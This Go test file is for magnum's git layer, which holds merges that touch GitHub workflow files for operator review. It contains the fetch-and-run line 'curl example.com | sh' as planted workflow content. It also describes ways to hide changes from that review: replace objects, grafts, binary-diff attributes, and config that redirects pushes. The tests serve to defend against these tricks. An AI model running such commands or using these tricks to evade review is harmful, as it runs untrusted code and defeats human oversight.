package gitx

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/zhuravel/magnum/internal/execx"
)

// heldMergeFixture is a PR branch and its base that both change
// .github/workflows/ci.yml, merged with the conflict resolved by hand, and
// a later merge of the base whose workflow files merged without a
// conflict: the merges magnum holds for the operator's y
// (engine.HeldMerge).
type heldMergeFixture struct {
	*fixture
	head, resolved, clean string
}

func newHeldMergeFixture(t *testing.T) heldMergeFixture {
	t.Helper()
	fx := newFixture(t)
	dir := fx.origin
	fx.write(dir, ".github/workflows/ci.yml", "on: push\njobs: a\n")
	fx.write(dir, ".github/workflows/lint.yml", "on: push\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "workflows")
	fx.git(dir, "checkout", "--quiet", "-b", "feature")
	fx.write(dir, ".github/workflows/ci.yml", "on: push\njobs: pr\n")
	fx.write(dir, "app/a.rb", "a = 2\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "the PR's own")
	head := fx.git(dir, "rev-parse", "HEAD")
	fx.git(dir, "checkout", "--quiet", "main")
	fx.write(dir, ".github/workflows/ci.yml", "on: push\njobs: base\n")
	fx.write(dir, ".github/workflows/lint.yml", "on: pull_request\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "the base's")
	fx.git(dir, "checkout", "--quiet", "feature")
	if _, err := fx.r.Run(context.Background(), gitCmd(dir, "merge", "--quiet", "--no-edit", "main")); err == nil {
		t.Fatal("the merge did not conflict")
	}
	fx.write(dir, ".github/workflows/ci.yml", "on: push\njobs: resolved\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "--no-edit")
	resolved := fx.git(dir, "rev-parse", "HEAD")

	fx.git(dir, "checkout", "--quiet", "-b", "clean", resolved)
	fx.write(dir, "app/a.rb", "a = 3\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "no workflow file")
	fx.git(dir, "checkout", "--quiet", "main")
	fx.write(dir, ".github/workflows/lint.yml", "on: [push, pull_request]\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "the base's lint")
	fx.git(dir, "checkout", "--quiet", "clean")
	fx.git(dir, "merge", "--quiet", "--no-edit", "main")
	return heldMergeFixture{fixture: fx, head: head, resolved: resolved, clean: fx.git(dir, "rev-parse", "HEAD")}
}

// The operator reads what a merge magnum holds does to the workflow files
// before its y: RemergeDiff shows how the merge resolved its conflicts in
// the paths asked (git's own merge, conflict markers and all, against the
// merge as committed) and nothing outside them, with no commit header; a
// merge that resolved no conflict there shows nothing.
func TestRemergeDiffShowsHowAMergeResolvedItsConflictsInThePathsAsked(t *testing.T) {
	fx := newHeldMergeFixture(t)
	ctx := context.Background()
	got, err := fx.c.RemergeDiff(ctx, fx.origin, fx.resolved, ".github/workflows")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml", "remerge CONFLICT (content)",
		"-<<<<<<<", "-jobs: pr", "-jobs: base", "+jobs: resolved"} {
		if !strings.Contains(got, want) {
			t.Errorf("RemergeDiff = %q, want it to hold %q", got, want)
		}
	}
	for _, not := range []string{"lint.yml", "app/a.rb", "Author:", "commit "} {
		if strings.Contains(got, not) {
			t.Errorf("RemergeDiff = %q, want no %q", got, not)
		}
	}
	if got, err := fx.c.RemergeDiff(ctx, fx.origin, fx.clean, ".github/workflows"); err != nil || got != "" {
		t.Errorf("RemergeDiff of a merge with no conflict in the workflows = %q, %v; want none", got, err)
	}
	if _, err := fx.c.RemergeDiff(ctx, fx.origin, "-x", ".github/workflows"); err == nil {
		t.Error("an option as the merge was taken")
	}
	if _, err := fx.c.RemergeDiff(ctx, fx.origin, fx.resolved); err == nil {
		t.Error("RemergeDiff of no path was taken")
	}
}

// PathsDiff is everything one commit changes against another in the
// paths asked, and nothing outside them: the workflow files the push of a
// held merge changes against the PR's head.
func TestPathsDiffIsTheDiffOfTwoCommitsInThePathsAsked(t *testing.T) {
	fx := newHeldMergeFixture(t)
	ctx := context.Background()
	got, err := fx.c.PathsDiff(ctx, fx.origin, fx.head, fx.resolved, ".github/workflows")
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"diff --git a/.github/workflows/ci.yml", "-jobs: pr", "+jobs: resolved",
		"diff --git a/.github/workflows/lint.yml", "-on: push", "+on: pull_request"} {
		if !strings.Contains(got, want) {
			t.Errorf("PathsDiff = %q, want it to hold %q", got, want)
		}
	}
	if strings.Contains(got, "<<<<<<<") || strings.Contains(got, "app/a.rb") {
		t.Errorf("PathsDiff = %q, want the two commits' workflow files alone", got)
	}
	if got, err := fx.c.PathsDiff(ctx, fx.origin, fx.head, fx.head, ".github/workflows"); err != nil || got != "" {
		t.Errorf("PathsDiff of one commit = %q, %v; want none", got, err)
	}
	if _, err := fx.c.PathsDiff(ctx, fx.origin, fx.head, fx.resolved); err == nil {
		t.Error("PathsDiff of no path was taken")
	}
	if _, err := fx.c.PathsDiff(ctx, fx.origin, "-x", fx.resolved, ".github"); err == nil {
		t.Error("an option as a revision was taken")
	}
}

// The daemon's start removes the held refs no row names: RefsUnder lists
// the refs under a prefix of refs/magnum/, and refuses any other prefix.
func TestRefsUnderListsTheRefsUnderAPrefixOfRefsMagnum(t *testing.T) {
	fx := newHeldMergeFixture(t)
	ctx := context.Background()
	for _, ref := range []string{"refs/magnum/held/7", "refs/magnum/held/12", "refs/magnum/pr/7"} {
		if err := fx.c.UpdateRef(ctx, fx.origin, ref, fx.resolved); err != nil {
			t.Fatal(err)
		}
	}
	got, err := fx.c.RefsUnder(ctx, fx.origin, "refs/magnum/held/")
	if want := []string{"refs/magnum/held/12", "refs/magnum/held/7"}; err != nil || !slices.Equal(got, want) {
		t.Errorf("RefsUnder = %q, %v; want %q", got, err, want)
	}
	for _, bad := range []string{"refs/heads/", "refs/magnum/held", "refs/magnum/", "-x/"} {
		if _, err := fx.c.RefsUnder(ctx, fx.origin, bad); err == nil {
			t.Errorf("RefsUnder of %q was taken", bad)
		}
	}
}

// The review's bug: execx keeps the first 8 MiB of a command's output and
// marks the rest cut, and these two readers returned the cut text, so a
// held-merge.diff could end before a workflow file the y pushes whole.
// Both refuse an output cut at the cap, as every other diff reader here
// does: the daemon then holds nothing.
func TestRemergeDiffAndPathsDiffRefuseAnOutputCutAtTheCap(t *testing.T) {
	const slot = "/w/talkable.review1"
	ctx := context.Background()
	c, _ := newFake(execx.Rule{Prefix: []string{"git", "-C", slot}, Result: execx.Result{Stdout: []byte("diff --git a/x b/x\n"), Truncated: true}})
	if _, err := c.RemergeDiff(ctx, slot, strings.Repeat("d3", 20), ".github/workflows"); err == nil || !strings.Contains(err.Error(), "more than") {
		t.Errorf("RemergeDiff of a cut output = %v, want an error", err)
	}
	if _, err := c.PathsDiff(ctx, slot, strings.Repeat("a1", 20), strings.Repeat("d3", 20), ".github/workflows"); err == nil || !strings.Contains(err.Error(), "more than") {
		t.Errorf("PathsDiff of a cut output = %v, want an error", err)
	}
}

// The review's bug (J1): gitx's reads honored refs/replace/ and info/grafts
// in the clone, which the fixer's pane can write, while git push sends the
// real objects: a replaced blob showed benign workflow text in
// held-merge.diff while the y pushed the real one, and a replaced tree
// made DifferingPaths see no workflow change, so the merge went out with
// the Workflows token unheld. Every gitx call reads the real objects now
// (GIT_NO_REPLACE_OBJECTS, and an empty graft file, since git 2.56 still
// reads info/grafts whatever GIT_NO_REPLACE_OBJECTS says): the diffs,
// DifferingPaths, Parents and IsAncestor.
func TestGitxReadsTheRealObjectsWhateverTheClonesReplacementsAndGrafts(t *testing.T) {
	fx := newHeldMergeFixture(t)
	ctx := context.Background()
	dir := fx.origin
	// a benign blob in place of the merge's resolved ci.yml, and the head's tree in place of the merge's
	realBlob := fx.git(dir, "rev-parse", fx.resolved+":.github/workflows/ci.yml")
	harmless := filepath.Join(t.TempDir(), "harmless.yml")
	if err := os.WriteFile(harmless, []byte("on: push\njobs: harmless\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	fake := fx.git(dir, "hash-object", "-w", harmless)
	fx.git(dir, "replace", realBlob, fake)
	fx.git(dir, "replace", fx.git(dir, "rev-parse", fx.resolved+"^{tree}"), fx.git(dir, "rev-parse", fx.head+"^{tree}"))
	// a parent the merge does not have, by a graft and by info/grafts
	fx.git(dir, "replace", "--graft", fx.clean, fx.head)
	gitDir := fx.git(dir, "rev-parse", "--path-format=absolute", "--git-common-dir")
	if err := os.WriteFile(filepath.Join(gitDir, "info", "grafts"), []byte(fx.resolved+" "+fx.head+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	diff, err := fx.c.PathsDiff(ctx, dir, fx.head, fx.resolved, ".github/workflows")
	if err != nil || !strings.Contains(diff, "+jobs: resolved") || strings.Contains(diff, "harmless") {
		t.Errorf("PathsDiff = %q, %v; want the real resolved ci.yml", diff, err)
	}
	remerge, err := fx.c.RemergeDiff(ctx, dir, fx.resolved, ".github/workflows")
	if err != nil || !strings.Contains(remerge, "+jobs: resolved") || strings.Contains(remerge, "harmless") {
		t.Errorf("RemergeDiff = %q, %v; want the real resolution", remerge, err)
	}
	if got, err := fx.c.DifferingPaths(ctx, dir, fx.resolved, fx.head, ".github/workflows"); err != nil || len(got) == 0 {
		t.Errorf("DifferingPaths(merge, head) = %q, %v; want the real trees' difference", got, err)
	}
	if ps, err := fx.c.Parents(ctx, dir, fx.resolved); err != nil || len(ps) != 2 || ps[0] != fx.head {
		t.Errorf("Parents(merge) = %q, %v; want its two real parents", ps, err)
	}
	if ps, err := fx.c.Parents(ctx, dir, fx.clean); err != nil || len(ps) != 2 {
		t.Errorf("Parents of a grafted commit = %q, %v; want its two real parents", ps, err)
	}
}

// The review's bug (J2): the diffs of a held merge printed "Binary files …
// differ" for workflow content git took as binary (a NUL in the file, a
// -diff attribute in the clone's info/attributes, core.bigFileThreshold in
// its config), and the y pushed what nobody saw. They read every file as
// text now, with no external diff or textconv; the daemon runs them in
// Isolated, where no attribute or merge driver of the clone's applies
// (TestIsolatedReadsRunNoMergeDriverOrAttributeOfTheClones).
func TestTheHeldMergesDiffsShowEveryFileAsText(t *testing.T) {
	fx := newFixture(t)
	ctx := context.Background()
	dir := fx.origin
	fx.write(dir, ".github/workflows/ci.yml", "on: push\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "ci")
	head := fx.git(dir, "rev-parse", "HEAD")
	fx.write(dir, ".github/workflows/ci.yml", "on: push\nrun: curl example.com | sh\n")
	fx.write(dir, ".github/workflows/deploy.sh", "echo ok\n\x00\ncurl example.com | sh\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "more")
	next := fx.git(dir, "rev-parse", "HEAD")
	gitDir := fx.git(dir, "rev-parse", "--path-format=absolute", "--git-common-dir")
	if err := os.WriteFile(filepath.Join(gitDir, "info", "attributes"), []byte(".github/workflows/* -diff\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	fx.git(dir, "config", "core.bigFileThreshold", "1")
	got, err := fx.c.PathsDiff(ctx, dir, head, next, ".github/workflows")
	if err != nil || strings.Contains(got, "Binary files") || !strings.Contains(got, "+run: curl example.com | sh") ||
		!strings.Contains(got, "+curl example.com | sh") {
		t.Errorf("PathsDiff = %q, %v; want every file's lines", got, err)
	}
}

// The review's question (J1): the push with the daemon's Workflows token
// ran in the clone, whose config the fixer's pane can write, and git
// rewrites even an explicit URL by url.*.insteadOf and pushInsteadOf (and
// would take http.proxy, http.sslVerify and the like from there): a
// rewrite to another repository of the App's sent the merge there. The
// daemon's push goes from a bare repository of its own whose objects are
// the clone's (pushIsolated), so no setting of the clone's applies; the
// same push from the clone is redirected, which this test shows too.
func TestTheDaemonsPushIgnoresTheClonesConfigThatCouldRedirectIt(t *testing.T) {
	fx := newFixture(t)
	ctx := context.Background()
	decoy := filepath.Join(filepath.Dir(fx.origin), "decoy")
	fx.git(filepath.Dir(fx.origin), "init", "--quiet", "--bare", decoy)
	fx.git(fx.clone, "switch", "--quiet", "--detach", fx.pr)
	head := fx.commit(fx.clone, "app/a.rb", "a = 3\n", "fix")
	fx.git(fx.clone, "config", "url."+decoy+".pushInsteadOf", fx.origin)
	fx.git(fx.clone, "config", "remote.origin.pushurl", decoy)
	if err := fx.c.PushLeaseViaAs(ctx, fx.clone, fx.origin, fx.pr, "pr7", "", nil); err != nil {
		t.Fatalf("a push from the clone itself: %v", err)
	}
	if got := fx.git(decoy, "for-each-ref", "--format=%(refname)"); got != "refs/heads/pr7" {
		t.Fatalf("the decoy has %q: the clone's pushInsteadOf did not redirect a push from the clone, so this test shows nothing", got)
	}
	if err := fx.c.pushIsolated(ctx, fx.clone, fx.origin, head, "pr7", fx.pr, nil); err != nil {
		t.Fatalf("pushIsolated = %v", err)
	}
	if got := fx.git(fx.origin, "rev-parse", "refs/heads/pr7"); got != head {
		t.Errorf("origin's pr7 = %s, want the pushed %s", got, head)
	}
	if got := fx.git(decoy, "rev-parse", "refs/heads/pr7"); got != fx.pr {
		t.Errorf("the decoy's pr7 = %s: the daemon's push followed the clone's config", got)
	}
}

func TestTheDaemonsPushWorksFromAShallowClone(t *testing.T) {
	fx := newFixture(t)
	ctx := context.Background()
	fx.git(fx.origin, "checkout", "--quiet", "pr7")
	tip := fx.commit(fx.origin, "app/a.rb", "a = 2\n", "c3 pr7")
	fx.git(fx.origin, "checkout", "--quiet", "main")
	shallow := filepath.Join(filepath.Dir(fx.origin), "shallow")
	fx.git(filepath.Dir(fx.origin), "clone", "--quiet", "--depth", "1", "--no-single-branch", "file://"+fx.origin, shallow)
	if got := fx.git(shallow, "rev-parse", "--is-shallow-repository"); got != "true" {
		t.Fatalf("the clone is not shallow (%s), so this test shows nothing", got)
	}
	fx.git(shallow, "switch", "--quiet", "--detach", "origin/pr7")
	head := fx.commit(shallow, "app/a.rb", "a = 3\n", "fix")
	if err := fx.c.pushIsolated(ctx, shallow, fx.origin, head, "pr7", tip, nil); err != nil {
		t.Fatalf("pushIsolated from a shallow clone = %v", err)
	}
	if got := fx.git(fx.origin, "rev-parse", "refs/heads/pr7"); got != head {
		t.Errorf("origin's pr7 = %s, want the pushed %s", got, head)
	}
}

func TestGitxsGraftFileAddsNoAdviceToGitsOutput(t *testing.T) {
	fx := newFixture(t)
	res, err := fx.c.git(context.Background(), fx.clone, call{label: "log"}, "log", "--format=%H", "origin/pr7")
	if err != nil || res.Out() == "" {
		t.Fatalf("log = %q, %v", res.Out(), err)
	}
	if strings.Contains(string(res.Stderr), "graft") {
		t.Errorf("git's stderr carries the graft file's advice:\n%s", res.Stderr)
	}
}

// The factory's check of a base merge (internal/factory, review_merge.go)
// asks which files a merge of the base differs in from git's own merge of
// its parents: RemergeFiles lists the files `git show --remerge-diff`
// shows, the conflicts the merge resolved and the changes it made that
// git's merge would not have (an "evil merge"), and none for a merge that
// is git's own. A commit of one parent is refused, since --remerge-diff
// would list its own changes, and so is an option in the merge's place.
func TestRemergeFilesAreTheFilesAMergeDiffersInFromGitsOwnMerge(t *testing.T) {
	fx := newHeldMergeFixture(t)
	ctx := context.Background()
	dir := fx.origin
	if got, err := fx.c.RemergeFiles(ctx, dir, fx.resolved); err != nil || !slices.Equal(got, []string{".github/workflows/ci.yml"}) {
		t.Errorf("RemergeFiles of the resolved merge = %q, %v; want ci.yml alone", got, err)
	}
	if got, err := fx.c.RemergeFiles(ctx, dir, fx.clean); err != nil || len(got) != 0 {
		t.Errorf("RemergeFiles of a clean merge = %q, %v; want none", got, err)
	}
	// an evil merge: git's merge is clean, and the commit adds a file and changes another beyond it
	fx.git(dir, "checkout", "--quiet", "-b", "evil", fx.resolved)
	fx.write(dir, "app/a.rb", "a = 4\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "the PR again")
	fx.git(dir, "checkout", "--quiet", "main")
	fx.write(dir, "app/b.rb", "b = 1\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "-m", "the base again")
	fx.git(dir, "checkout", "--quiet", "evil")
	fx.git(dir, "merge", "--quiet", "--no-commit", "main")
	fx.write(dir, "app/evil file.rb", "evil\n")
	fx.write(dir, "README.md", "changed in the merge\n")
	fx.git(dir, "add", ".")
	fx.git(dir, "commit", "--quiet", "--no-edit")
	evil := fx.git(dir, "rev-parse", "HEAD")
	if got, err := fx.c.RemergeFiles(ctx, dir, evil); err != nil || !slices.Equal(got, []string{"README.md", "app/evil file.rb"}) {
		t.Errorf("RemergeFiles of an evil merge = %q, %v; want README.md and app/evil file.rb", got, err)
	}
	// in a repository of the daemon's own, by the full id, alike
	if err := fx.c.Isolated(ctx, dir, func(iso string) error {
		got, err := fx.c.RemergeFiles(ctx, iso, evil)
		if err != nil || !slices.Equal(got, []string{"README.md", "app/evil file.rb"}) {
			t.Errorf("RemergeFiles in Isolated = %q, %v; want the evil merge's files", got, err)
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	if got, err := fx.c.RemergeFiles(ctx, dir, fx.head); err == nil {
		t.Errorf("RemergeFiles of a commit of one parent = %q, want an error", got)
	}
	if _, err := fx.c.RemergeFiles(ctx, dir, "-x"); err == nil {
		t.Error("an option as the merge was taken")
	}
}

// A remerge diff past execx.MaxOutput is no list of files: RemergeFiles
// refuses an output cut at the cap, as the other diff readers do, and the
// factory then reviews the head in a full round.
func TestRemergeFilesRefusesAnOutputCutAtTheCap(t *testing.T) {
	const slot = "/w/talkable.factory1"
	merge := strings.Repeat("d3", 20)
	parents := merge + " " + strings.Repeat("a1", 20) + " " + strings.Repeat("b2", 20) + "\n"
	c, _ := newFake(
		execx.Rule{Prefix: []string{"git", "-C", slot, "rev-list", "--parents"}, Result: execx.Result{Stdout: []byte(parents)}},
		execx.Rule{Prefix: []string{"git", "-C", slot, "show"}, Result: execx.Result{Stdout: []byte("app/a.rb\x00"), Truncated: true}})
	if got, err := c.RemergeFiles(context.Background(), slot, merge); err == nil || !strings.Contains(err.Error(), "more than") {
		t.Errorf("RemergeFiles of a cut output = %q, %v; want an error", got, err)
	}
}
